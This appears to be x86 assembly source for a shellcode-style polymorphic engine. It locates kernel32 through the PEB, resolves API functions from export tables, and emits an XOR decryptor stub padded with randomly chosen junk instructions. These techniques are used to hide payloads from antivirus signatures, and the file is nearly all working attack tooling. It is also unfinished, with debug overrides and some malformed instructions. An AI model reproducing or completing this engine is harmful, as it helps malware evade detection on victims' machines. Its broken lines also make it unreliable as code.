	
	.data
		patternptr db "=> %p",13,10,0
		patterndeci db "=> %d",13,10,0
		patternstr db " =>%s",13,10,0
		before	db "before",13,10,0
		after	db "after",13,10,0
.code
beg_sh:
	call	start
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;get the Kernel32 address stored in PEB
;IN	NOTHING
;OUT	eax:::KERNEL32ADDRESS : INT
;void* __stdcall__GetKernel32Address()
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GetKernel32Address:
push	ebp
mov	ebp, esp

push	esi
xor	eax, eax
xor	esi, esi

assume	fs:nothing					; bypass masm protection
mov	eax, fs:[30h]					; PEB      TIB[30h] => Linear address of Process Environment Block (PEB)
mov	eax, [eax + 0Ch]					; LOADER    aka _PEB_LDR_DATA
mov	esi, [eax + 1Ch]					; InitializationOrderModuleList
lodsd
mov	eax, [eax + 8]					; InInitializationOrderModuleList(3) <=> kernel32

pop	esi

mov	esp, ebp					;epilogue
pop	ebp						;epilogue
ret							;GetKernel32Address endp

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;get the export table in a dll wich contains  adresses of provided functions
;IN	dllAddress : dword
;OUT	eax::ExportTableAddress : dword
;void* __stdcall__GetExportTableAddress(void *dllAddr)
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GetExportTableAddress:
push	ebp
mov	ebp, esp

push	ebx
xor	ebx, ebx

mov	eax, [ebp + 8]					;dllAddr<=>ImageBase
mov	ebx, [eax + 3Ch]					; += RVA of  PE header
add	ebx, eax 					; == PE HEADER

mov	ebx, [ebx + 78h]					; += IMAGE_EXPORT_DIRECTORY in PE HEADER
add	ebx, eax					; == ExportTable
mov	eax, ebx

pop	ebx

mov	esp, ebp					;epilogue
pop	ebp
ret	4						;GetExportTableAddress endp

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;	get the address of a function stored in a dll
;IN	kernel32Addr : dword, exportTableAddress : dword, sAddrFuncName: dword
;OUT	eax::FuncAddr : dword
;void* __stdcall__GetFuncAddr(void* dllImageBase, void* exportTable, char* sAddrFuncName)
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

GetFuncAddr:
push	ebp
mov	ebp, esp

push	ebx
push	esi
push	edi

xor	eax, eax
xor	ebx, ebx
xor	ecx, ecx
xor	esi, esi
xor	edi, edi

mov	edx, [ebp + 8]					;edx = dllImageBase
mov	ebx, [ebp + 12]					;ebx = exportTable

mov	esi, [ebx + 20h]				;table of "pointeurs de noms" (AddressOfNames) en rva 
add	esi, edx					;+ ImageBase

FindFunc:						;seeking Function indice in AddressOfNAmes, store result in ecx
lodsd
add	eax, edx					;+ ImageBase because each NamesPointers addr are RVA
mov	edi, eax
push	esi
mov	esi, [ebp + 16]					;sAddrFuncName

StringCmp:
cmpsb							;cmp byte ds:esi, byte ds:edi
jne	NextFunction
cmp	byte ptr [edi], 0
je	FuncFound
jmp	StringCmp

NextFunction:
pop	esi
inc	ecx
jmp	FindFunc
;							;ordinalTable(ecx) == &Func
FuncFound:						;indice of Func is now in ecx
xor	eax, eax
mov	esi, [ebx + 24h]				;&ordinalTable
shl	ecx, 1
add	esi, ecx
add	esi, edx
mov	ax, word ptr [esi]
shl	eax, 2
add	eax, [ebx + 1Ch]
add	eax, edx
mov	ebx, [eax]
add	ebx, edx
mov	eax, ebx

pop	esi						;clear the stack

pop	edi
pop	esi
pop	ebx
mov	esp, ebp
pop	ebp
ret	12						;GetFuncAddr endp

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; codebuffer:
; byte		0;00401000 > $ E8 call
; dword		0; 0000000     decrypt.00401005
; byte		0;00401005   $ 5B       POP EBX
; word		0;00401006   . 8BC3           MOV EAX,EBX
; byte		0;00401008   . 2D 05000000    SUB EAX
; dword		0;05
; word		0;0040100D   . 83E8 02        SUB EAX,
; byte		0;2
; word		0;00401010   . 8BC8           MOV ECX,EAX
; word		0;00401012   . 83E9 04        SUB ECX
; byte		0;,4
; byte		0;00401015   . BA 2A000000    MOV EDX,
; dword		0;2A
; word		0;0040101A   . 03D3           ADD EDX,EBX
; word		0;0040101C   . 8B09           MOV ECX,DWORD PTR DS:[ECX]
;label:
; word		0;0040101E   > 8A1A           MOV BL,BYTE PTR DS:[EDX]
; byte		0;00401020   . 50             PUSH EAX
; word		0;00401021   . 8B00           MOV EAX,DWORD PTR DS:[EAX]
; word		0;00401023   . 32D8           XOR BL,AL
; byte		0;00401025   . 58             POP EAX
; word		0;00401026   . 881A           MOV BYTE PTR DS:[EDX],BL
; byte		0;00401028   . 42             INC EDX
; byte		0;00401029   . 49             DEC ECX
; word		0;0040102A   . 83F9 00        CMP ECX,
; byte		0;0
; word		0;0040102D   .75 EF          JNZ SHORT decrypt.0040101E -15
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;polymorpher()
;ret eax buffer   (pointeur sur  le code malloce)
;ecx	buffer_len (du code monomorphe)
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
polymorpher:
	push	ebx
	push	edx
	
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; ~~vars~~
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	mov	dword ptr [ebp - 900], 2Ah		;var1 = 42 
	mov	dword	ptr [ebp - 904], 0		;cpt1 compteur d'instructions added entre un_end et un_delta
	;mov	dword  ptr [ebp - 908], 0EFh		;var2 = -15 == u239  (si > 255 ==?????)
	;mov	dword ptr [ebp - 912], 0		;cpt2  compteur d'instructions dans la boucle i.e sous un_crypting

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	;
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	push	512
	call	dword ptr [ebp - 308]	;malloc(512)
	add	esp, 4
	or	eax, eax
	jz	malloc_error
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	push	eax				; sauvegarde du pointeur debut de buffer
	mov	edi, eax					

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; BEGIN POLYMORPHIC GENERATTION
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	;/!\
	;
	;un_crypting:
	;
	
	;; call	un_delta => E8 0000 0000
	xor	al, al
	or	al, 0E8h
	stosb

	xor	eax, eax
	stosd

	;
	;un_delta
	;

	;/!\
	
	;; pop ebx  5B
	xor	al, al
	or	al,05Bh
	stosb
	
	; /!\
	
	
	;; mov	eax, ebx 8BC3   ax:[al/8B || ah/C3]
	xor	ax, ax
	or	al, 8Bh			;mov
	or	ah, 0C3h		;eax, ebx
	stosw

	; /!\
	
	
	;; sub eax, un_end - un_delta
	xor	al, al
	or	al, 02Dh
	stosb
	;; imm32 5
	xor	eax,eax
	or	eax, 5d
	stosd

	; /!\
	
	;; sub eax, 83E8
	xor	ax, ax
	or	al, 83h
	or 	ah, 0E8h
	stosw

	;; 2 imm8
	xor	al, al
	or	al,02h
	stosb

	; /!\
	
	;; mov	ecx,eax
	xor	ax, ax
	or	al,8Bh
	or	ah, 0C8h
	stosw

	; /!\
	
	;; sub ecx 83E9
	xor	ax, ax
	or	al,83h
	or	ah, 0E9h
	stosw

	
	;; imm8 04
	xor	al,al
	or	al, 04d
	stosb


	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; ~~junk~~
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	push	[ebp - 308]
	push	[ebp - 312]
	call	do_junk				;do_junk(&GetSystemTime, &malloc)
	add	byte ptr [ebp - 904], al	;cpt += added_junk
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
	; /!\
	
	;; mov	edx,
	xor	al, al
	or	al, 0BAh
	stosb
	
	;; imm32 2A + junk_size lower than un_delta (un_end - un_delta)
	;var 2
	xor	eax,eax
	mov	al, byte ptr [ebp - 900]	;var1
	add	al, byte ptr [ebp - 904]	;+ cpt1
	stosd

	;invoke	crt_printf, offset patterndeci, eax
	;invoke crt_printf, offset patterndeci, byte ptr [ebp - 904]
	;invoke ExitProcess, 0
	;/!\

	;; add edx, ebx 03D3
	xor	ax, ax
	or	al, 03h
	or	ah, 0D3h
	stosw

	;/!\
	
	;; mov ecx, [ecx] 8B09
	xor	ax, ax
	or	al, 8bh
	or	ah, 09h
	stosw
	
	;/!\

	;
	;un_crypting:
	;
	
	;; mov	bl, [edx] 8A1A
	xor	ax,ax
	or	al,8Ah
	or	ah,1Ah
	stosw
	
	;; push	eax 50
	xor	al,al
	or	al,50h
	stosb
	;; mov eax,[eax] 8b00
	xor	ax, ax
	or	al,8bh
	or	ah, 00h
	stosw

	;; xor	bl,al 32D8
	xor	ax, ax
	or	al, 32h
	or	ah, 0D8h
	stosw
	
	;; pop	eax 58
	xor	al, al
	or	al, 58h
	stosb

	;; mov	[edx], bl 881A
	xor	ax, ax
	or	al, 88h
	or	ah, 1Ah
	stosw

	;; inc edx 42 \o/
	xor	al, al
	or	al,42h
	stosb
	;; dec ecx 49
	xor	al, al
	or	al,49h
	stosb

	;; cmp ecx, imm8 83F9
	xor 	ax, ax
	or	al,83h
	or	ah,0F9h
	stosw

	;; 0
	xor	al, al
	or	al, 00h
	stosb

	; push	[ebp - 308]
	; push	[ebp - 312]
	; call	do_junk				;do_junk(&GetSystemTime, &malloc)
	; add	bl, al

	xor	ax, ax
	or	al, 75h
	or	ah, 0EFh
	stosw
	
	; invoke	crt_printf, offset patterndeci, ah
	; invoke	crt_printf, offset patterndeci, byte ptr [ebp - 908]
	; invoke	crt_printf, offset patterndeci, byte ptr [ebp - 912]
	; invoke	ExitProcess, ah

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	pop	eax				;ret le buffer
	mov	ecx, edi			
	sub	ecx, eax			;ret len (&bufferafter - &bufferbefore)
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	pop	edx				
	pop	ebx
jmp end_poly




;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;params edi == buffer
;int do_junk(&GetSystemTime, &malloc)
;return opcodelen of the junk instruction generated
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;do_junk stack
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; ebp - 4	nb junk instructions	
; ebp - 8 	 *opcode1
; ebp - 12     	 opcode1_len
; ebp - 16 	 *opcode2
; ebp - 20     	 opcode2_len
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
do_junk:
	push	ebp		;prolog
	mov	ebp, esp	;prolog	
	sub	esp, 512	;allocate space
	push	edx		;save non ready for use register

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; quit 50% of the time
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; push	[ebp + 8]
	; push	2
	; call	get_random
	; or	eax, eax
	; jz	_zomg_end

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	;BEGIN writing malloced string of all junk instructions
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	push	16
	call	dword ptr [ebp + 12]			;malloc(opcodes_buffer)
	add	esp, 4
	or	eax, eax
	jz	_zomg_end

	push	edi					;save caller edi for futur use
	mov	edi, eax				;new edi = callee malloced buffer
	
	mov	dword ptr [ebp - 4], 1d			;nb instructions

	;1 write opcode1 nop
	mov	[ebp - 8], edi
	xor	eax, eax
	or	al, 090h
	stosb
	mov	dword ptr [ebp - 12], 1d		;instruction len

	;2 write opcode2 4 x nop
	mov	[ebp - 16], edi
	xor	eax, eax
	or	al, 090h
	stosb
	stosb
	stosb
	stosb
	mov	dword ptr [ebp - 20], 4d		;instruction2 len

	;3 . 86C0           XCHG AL,AL
	mov	[ebp - 24], edi
	xor	eax, eax
	or	al, 86h
	or	ah, 0C0h	
	stosw
	mov	dword ptr [ebp - 28], 2d
	
	;4 00401005   . 86E4           XCHG AH,AH
	mov	[ebp - 32], edi
	xor	eax, eax
	or	al, 86h
	or	ah, 0E4h
	stosw
	mov	dword ptr [ebp - 36], 2d
	
	
	;5 00401007   . 87DB           XCHG EBX,EBX
	mov	[ebp - 40], edi
	xor	eax, eax
	or	al, 87h
	or	ah, 0DBh
	stosw
	mov	dword ptr [ebp - 44], 2d
	
	; 6. 66:87DB        XCHG BX,BX
	mov	[ebp - 48], edi
	xor	al, al
	or	al, 66h
	stosb
	xor 	ax
	or	al, 87h
	or	ah, 0DBh
	stosw
	mov	dword ptr [ebp - 52], 3d

	;7 0040100C   . 87C9           XCHG ECX,ECX
	mov	[ebp - 56], edi
	xor	eax, eax
	or	al, 87h
	or	ah, 0C9h
	stosw
	mov	dword ptr [ebp - 60], 2d

	;8 0040100E   . 66:87C9        XCHG CX,CX
	mov	[ebp - 64], edi
	xor	al, al
	or	al, 66h
	stosb
	xor 	ax
	or	al, 87h
	or	ah, 0C9h
	stosw
	mov	dword ptr [ebp - 70], 3d
	
	;9 00401011   . 87D2           XCHG EDX,EDX
	mov	[ebp - 74], edi
	xor	eax, eax
	or	al, 87h
	or	ah, 0D2h
	stosw
	mov	dword ptr [ebp - 78], 2d
	
	;10 00401013   . 66:87D2        XCHG DX,DX
	
	;11 00401016   . 87F6           XCHG ESI,ESI
	
	;12 00401018   . 66:87F6        XCHG SI,SI
	;13 0040101B   . 87FF           XCHG EDI,EDI
	;14 0040101D   . 66:87FF        XCHG DI,DI
	;15 00401021   . 83C0 00        ADD EAX,0
	;16 00401024   . 83C3 00        ADD EBX,0
	;17 00401027   . 83C1 00        ADD ECX,0
	;18 0040102A   . 83C2 00        ADD EDX,0
	;19 0040102D   . 83C7 00        ADD EDI,0
	;20 00401030   . 83C6 00        ADD ESI,0
	;21 00401033   . 83E8 00        SUB EAX,0
	;22 00401036   . 83EB 00        SUB EBX,0
	;23 00401039   . 83E9 00        SUB ECX,0
	;24 0040103C   . 83EA 00        SUB EDX,0
	;25 0040103F   . 83EE 00        SUB ESI,0
	
	; + push + pop
	;6



	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; END INSTRUCTION BUFFERISATION
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; GETTING RANDOM INSTRUCTION
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	push	[ebp + 8]
	push	[ebp - 4]		
	call	get_random		;Get_random(nb_instructions, &GetSystemTime)
	inc	eax			

	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	;DEBUG
	mov	eax, 4d
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
	mov	edx, 8
	mul	edx			; eax = (random * 8)

	mov	ecx, ebp		
	sub	ecx, eax		; ecx => ebp - eax
	
	push	ecx			; save offset instruction ebp - (random * 8)
	
	sub	ecx, 4d			; pointe sur la taille de l'instruction
	mov	ecx, [ecx]	
	
	pop	edx			; restore offset instruction
	pop	edi			; restore caller edi to write in it

	push	ecx			; save len to return it after
	mov	edx, [edx]		; dereference **str => *str
	
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	; WRITING CHOOSEN INSTRUCTION
	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	myloop:
	push	edx					; edx =  str aremove ??
	mov	eax, [edx]				;eax = *str
	stosb
	pop	edx
	inc	edx					; str++
	loop	myloop

	pop	eax					; ret len
	jmp	_normal_end
_zomg_end:
	xor	eax, eax				; ret 0
_normal_end:
	pop	edx
	leave
	ret 8

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;get_random(int max, &GetSystemTime)
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
get_random:
	push	ebp
	mov	ebp, esp
	push	ecx
	push	edx
	push	ebx
	push	esi
	push	edi

	push	[ebp + 12]
	call	random		;random(&GetSystemTime)
	xor	edx,edx
	mov	ecx, [ebp + 8]
	div	ecx
	mov	eax,edx

	pop	edi
	pop	esi
	pop	ebx
	pop	edx
	pop	ecx
	
	leave
	ret	8

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;random(&GetSysTemTime)
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
random:
	push	ebp
	mov	ebp, esp
	push	ebx
	push	esi
	push	edi

	sub	esp, 200
	lea	edi, [ebp - 100]
	push	edi

	call	dword ptr [ebp + 8]	;GetSystemTime(lpSystemTime)
	xor	eax,eax
	lea	edi, [ebp - 100]
	add	edi, 14
	mov	esi, [edi]
	mov	ax, si			;ms
	sub	edi, 2
	shl	eax, 16
	mov	esi, [edi]
	mov	ax, si			;secs

	pop	edi
	pop	esi
	pop	ebx
	leave
	ret	4
